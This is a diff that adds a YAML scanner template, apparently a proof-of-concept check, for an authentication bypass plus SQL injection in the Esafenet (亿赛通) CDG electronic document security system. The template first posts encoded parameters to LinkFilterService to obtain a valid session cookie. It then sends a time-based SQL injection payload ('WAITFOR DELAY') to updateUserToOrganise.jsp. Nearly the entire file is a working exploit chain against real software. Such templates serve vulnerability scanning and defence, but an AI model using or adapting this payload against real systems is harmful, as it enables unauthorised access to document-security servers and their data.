@@ -1,0 +1,29 @@
+name: 亿赛通-电子文档安全管理系统-updateUserToOrganise-SQL注入
+description: >-
+  身份绕过后台SQL注入
+alwaysExecute: false
+timeout: 5
+matchCount: 2
+rules:
+  - method: POST
+    path: /CDGServer3/LinkFilterService
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    search: >-
+      JSESSIONID=(?P<cookie>[^;]+)
+    body: >-
+      path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+    expression:
+      status: 302
+      headers:
+        Set-Cookie: JSESSIONID
+  - method: POST
+    path: /CDGServer3/user/updateUserToOrganise.jsp;Service
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: JSESSIONID={{cookie}};
+    body: >-
+      userId=1';WAITFOR DELAY '0:0:1'--
+    expression:
+      status: 200
+      sleep: 3
